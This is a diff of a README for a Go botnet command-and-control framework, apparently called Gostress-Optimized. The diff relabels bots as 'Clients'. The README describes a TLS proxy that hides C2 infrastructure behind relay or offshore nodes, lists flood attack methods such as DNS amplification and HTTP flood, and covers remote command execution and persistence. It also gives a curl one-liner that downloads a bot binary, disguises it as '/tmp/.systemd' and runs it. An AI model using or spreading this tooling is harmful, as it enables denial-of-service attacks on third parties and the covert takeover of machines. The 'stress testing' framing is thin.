@@ -1,6 +1,6 @@
 
 ## Overview
-*This is a lightweight, web-based Command and Control (C2) framework with built-in stress testing capabilities. It allows operators to manage bots, monitor activity, and perform a variety of network stress test methods through a secure, intuitive interface.
+*This is a lightweight, web-based Command and Control C2 with stress testing capabilities using external Devices or Servers. It allows operators to manage Clients, monitor activity, and perform a variety of network stress test methods through a secure interface.
 
 <table>
   <tr>
@@ -15,7 +15,9 @@
 
 ## 🔁 TLS Proxy Module
 
-The TLS Proxy module enables encrypted traffic forwarding between bots and the core C2 server. This acts as a secure intermediary, offering stealth, traffic redirection, and flexible network deployment strategies.
+The TLS Proxy module enables encrypted traffic forwarding between Clients and the C2 server. This acts as a secure Third-party, offering stealth, traffic redirection, and flexible network deployment strategies.
+
+Hopefully to have P2P + load-balancing capabilites Implemented soon
 
 ---
 <table>
@@ -25,9 +27,9 @@ The TLS Proxy module enables encrypted traffic forwarding between bots and the c
 </table>
 
 ### 🌐 Purpose
-The proxy listens for incoming TLS connections from bots and securely forwards traffic to the core C2 server. This provides:
+The proxy listens for incoming TLS connections from Client and securely forwards traffic to the core C2 server. This provides:
 - **Obfuscation** of real C2 infrastructure
-- **Traffic rerouting** through dedicated relay nodes
+- **Traffic rerouting** through dedicated relay / offshore nodes
 - **Flexible deployment** across cloud or on-prem infrastructure
 
 ---
@@ -46,9 +48,9 @@ The proxy listens for incoming TLS connections from bots and securely forwards t
 
 ### 🛠 How It Works
 1. Proxy starts and listens for TLS connections on the configured IP/port.
-2. Once a bot connects, the proxy attempts a secure connection to the backend C2 server.
+2. Once a Client connects, the proxy attempts a secure connection to the backend C2 server.
 3. After both ends are connected, the proxy begins full-duplex communication using `io.Copy()`.
-
+4. This allows for secure communication and a hidden entry point towards the C2 server
 ---
 
 ### ✅ Usage
@@ -57,11 +59,13 @@ Build and run:
 go build -o proxy proxy.go
 ./proxy
 ```
+You will need to provide the certificates for this to work.
 
-## Features
+## Features 
+### All the same as Gostress just no Geolocation and a fully working dashboard with optimised code
 
 ### ✅ Web-Based Interface
-- Real-time bot monitoring
+- Real-time Client monitoring
 - Attack control panel
 - User management system
 - Attack history tracking
@@ -75,8 +79,8 @@ go build -o proxy proxy.go
 - DNS Amplification
 - HTTP Flood
 
-### 🧠 Bot Management
-- Auto bot connection handling
+### 🧠 Client Management
+- Auto Client connection handling
 - Heartbeat & status monitoring
 - Hardware resource reporting
 - Remote command execution
@@ -86,42 +90,34 @@ go build -o proxy proxy.go
 - TLS encrypted communication
 - Session & password management
 - Enforced password complexity
-
 ---
 
 ## Installation
-
-### Requirements
-- Go 1.18+ installed
-- Root access to a Linux server
-- Domain name (recommended for SSL)
 
 ### Quick Setup
 
 1. **Clone the repository**
    ```bash
-   git clone https://github.com/yourusername/scream-c2.git
-   cd scream-c2
+   git clone https://github.com/1Birdo/Gostress-Optimized.git
+   cd Gostress-Optimized
    ```
 
-2. **Build server and bot**
+2. **Build server and Client**
    ```bash
    go build -o server main.go
    go build -o bot bot.go
    ```
 
-3. **Generate SSL certificates**
-   ```bash
-   ./server --gen-cert
-   ```
-
-4. **Run the server**
+3. **Run the server**
    ```bash
    ./server
    ```
 
-5. **Deploy bots to desired systems**
+5. **Deploy clients to desired systems**
 
+   ```bash
+   You can decide how you want to access and deploy your client to the systems you own either 'scp' or a python http module or other methods.
+   ```
 ---
 
 ## Configuration
@@ -139,7 +135,7 @@ const (
 )
 ```
 
-### Bot Settings (`bot.go`)
+### Client Settings (`Client.go`)
 ```go
 const (
     C2Address = "your.server.ip:7003"
@@ -156,8 +152,8 @@ const (
   - **Username**: `root`
   - **Password**: *(auto-generated, shown on first run)*
 
-### Manage Bots
-- View all connected bots and their statuses
+### Manage Client
+- View all connected Client and their statuses
 - Access detailed hardware/resource reports
 - Execute remote commands
 
@@ -174,9 +170,9 @@ const (
 
 ## Deployment Options
 
-### Linux Bot Deployment
+### Linux Client Deployment
 ```bash
-curl http://your-server-ip/bot -o /tmp/.systemd && chmod +x /tmp/.systemd && /tmp/.systemd
+curl http://your-server-ip/Client -o /tmp/.systemd && chmod +x /tmp/.systemd && /tmp/.systemd
 ```
 
 ### Persistence Methods
@@ -188,8 +184,8 @@ curl http://your-server-ip/bot -o /tmp/.systemd && chmod +x /tmp/.systemd && /tm
 
 ## Troubleshooting
 
-### Bots not connecting?
-- Double-check `C2Address` in the bot binary
+### Clients not connecting?
+- Double-check `C2Address` in the Client binary
 - Ensure server ports are open and listening
 - Review firewall or security group settings
 
@@ -200,7 +196,7 @@ curl http://your-server-ip/bot -o /tmp/.systemd && chmod +x /tmp/.systemd && /tm
 
 ### Attacks not effective?
 - Confirm target IP/hostname and port
-- Ensure bots are online
+- Ensure Clients are online
 - Verify method compatibility
 
 ---
@@ -211,7 +207,7 @@ curl http://your-server-ip/bot -o /tmp/.systemd && chmod +x /tmp/.systemd && /tm
 - Use strong, unique passwords for all users
 - Restrict dashboard access (VPN, firewall, etc.)
 - Keep the system and Go packages updated
-- Regularly audit bot activity and logs
+- Regularly audit Clients activity and logs
 
 ---
 
